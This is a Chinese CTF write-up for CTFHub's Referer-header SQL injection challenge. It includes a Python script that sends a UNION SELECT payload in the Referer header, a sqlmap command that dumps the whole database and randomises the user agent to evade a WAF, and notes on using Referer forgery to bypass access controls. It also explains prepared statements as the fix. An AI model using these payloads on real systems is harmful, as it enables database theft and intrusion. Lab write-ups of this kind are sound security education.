Refer注入 - CTFHub Web 入门 Writeup

2026年9月18日 CTFHub Web安全 SQL注入 Referer

一、题目信息

  • 1.题目名称：Refer注入
  • 2.题目平台：CTFHub
  • 3.题目类型：Web / SQL注入 / HTTP头部注入
  • 4.靶场链接：http://challenge-20d8111da59d0869.sandbox.ctfhub.com:10800/
  • 5.涉及工具：Burp Suite（抓包改包）、Python（requests库）、SQLMap（自动化注入）

二、解题步骤

1. 分析题目考什么

题目页面极其简洁，只有一句提示：Refer注入 - 请在referer输入ID。

它考的是HTTP请求头注入。在此之前的题目，注入点可能藏在URL参数（GET）、表单（POST）、Cookie或User-Agent里。这道题把注入点换到了HTTP请求头的Referer字段。它的核心逻辑没变，依然是后端代码没有对用户的输入进行过滤，直接拼接到SQL语句中执行。

2. 怎么想

看到“Referer”和“输入ID”，立刻联想到刚做完的“Cookie注入”和“UA注入”。这三者本质上是同一类漏洞的不同变体。不要被“Referer”这个词吓到，它只是HTTP请求头里的一个字段。既然题目提示在这里输入，我们就直接在抓包工具或脚本里修改Referer头，测试SQL注入即可。

3. 怎么解

方案一：Python 脚本注入

在VS Code新建 refer_test.py：

import requests

# ⚠️ 替换为真实的靶场地址
url = "http://challenge-20d8111da59d0869.sandbox.ctfhub.com:10800/"

# 在Referer头里注入Payload
# 含义：-1让原查询落空，union select 1, 2测试回显位
headers = {"Referer": "-1 union select 1, 2"}

# 发送GET请求，带上恶意的Referer头
r = requests.get(url, headers=headers, timeout=5)
# 打印服务器返回的页面源码
print(r.text)

终端运行 python3 refer_test.py。如果回显了 Data: 2，说明注入成功。然后依次替换为查表名（`group_concat(table_name) from information_schema.tables...`）、查列名、拿Flag的语句。

方案二：SQLMap 一键脱库

sqlmap -u "http://challenge-20d8111da59d0869.sandbox.ctfhub.com:10800/" --referer="*" --level=3 --dump --batch --random-agent

命令详解：

  • --referer="*"：星号是灵魂，明确告诉SQLMap，注入点在Referer头里。
  • --level=3：提高测试等级，确保能充分探测HTTP头部。
  • --dump --batch：自动脱库，遇到询问默认选是。
  • --random-agent：随机生成User-Agent，绕过WAF拦截。

踩坑记录与改进：

踩坑一：HTTP 400 Bad Request。 在Burp里手工修改Referer时，如果直接插入空格或未编码的逗号，服务器会直接返回400错误。因为在HTTP头部中，空格和特殊符号必须进行URL编码（如空格变%20，逗号变%2C）。改进：手工注入时务必转义，或者直接使用Python脚本，requests库会自动帮我们处理编码。

踩坑二：环境过期导致SQLMap报错。 初次运行SQLMap时，报错[CRITICAL] all tested parameters do not appear to be injectable。原因是CTFHub环境寿命只有半小时，我折腾太久导致环境过期，所有请求都返回统一404页面。改进：遇到SQLMap全盘报错，第一时间去网页端“停止并销毁环境”重新开启，拿到新地址后秒回。

4. 怎么迁移

  • 其他HTTP头部注入：除了Referer，常见的还有X-Forwarded-For（用于伪造IP绕过限制）、Host头注入。如果遇到“访问限制”或“IP白名单”题目，可以尝试修改这些头部。
  • 其他安全领域：在SSRF（服务端请求伪造）中，Referer可能被用来绕过内网访问限制；在API安全中，伪造Referer可以绕过“防盗链”或“来源校验”机制。
  • 代码审计迁移：看到类似$_SERVER['HTTP_REFERER']直接拼接到SQL里的代码，立马判定为注入漏洞。

三、名词大全与原理深度复盘

1. Referer：HTTP请求头的一部分，用于告诉服务器“我是从哪个页面点击链接过来的”。常用于防盗链和访问统计。

2. HTTP头部注入：由于HTTP请求头（Cookie、User-Agent、Referer、XFF等）也是用户可控的输入，如果后端未做过滤直接拼接SQL，攻击者就能通过抓包工具修改这些头部进行SQL注入。

3. 预编译语句（Prepared Statement）：解决SQL注入的根本方法。它把“SQL指令”和“用户数据”彻底分离，无论用户输入什么恶意代码，数据库都只会将其视为纯文本，不会执行。

4. 底层逻辑深度复盘：为什么会有这个漏洞？本质是“客户端输入不可信原则”被打破。开发者以为Referer是浏览器自动生成的，普通用户无法修改，因此在后端代码中放松了警惕，直接将其拼接到SQL语句中。但通过Burp Suite抓包，攻击者可以随心所欲地修改任何HTTP头。这再次印证了Web安全的核心准则：永远不要信任来自客户端的任何数据。

四、题目思考

1. 跟前面的区别：小的区别在于输入点从URL参数、POST表单、Cookie、User-Agent转变为Referer。大的类型区别在于，前面往往是针对特定业务参数的常规注入，而这次是“HTTP头部注入”家族的又一变种。头部注入往往比常规注入更隐蔽，因为很多开发者只关注URL和表单，忽略了对HTTP头部的过滤。

2. 这种题目的出现原因：开发人员为了满足业务需求（比如防盗链、访问统计），需要读取Referer字段。为了偷懒或者缺乏安全意识，直接将其拼接到了SQL查询中，从而埋下了漏洞。他们认为用户改不了Referer，属于认知盲区。

3. 这种漏洞的应用：在真实渗透中，攻击者可以利用此漏洞窃取数据库中的敏感数据（如本CTF中的Flag），也可以用来绕过基于来源（Referer）的访问控制策略。比如某些后台功能只允许从站内特定页面跳转，攻击者伪造一个合法的Referer即可绕过限制。

4. 如何抽象理解概念：把一次HTTP请求想象成一个信封。URL是信封正面的收件地址，GET/POST参数是信纸上的正文，而Cookie、User-Agent、Referer就是信封背面的备注（比如“我是谁”、“我从哪里来”）。无论“信封背面的备注”多么不起眼，只要开发者把它当成“指令”读给了数据库听，那就是SQL注入。核心关键永远是：数据和指令的分离。
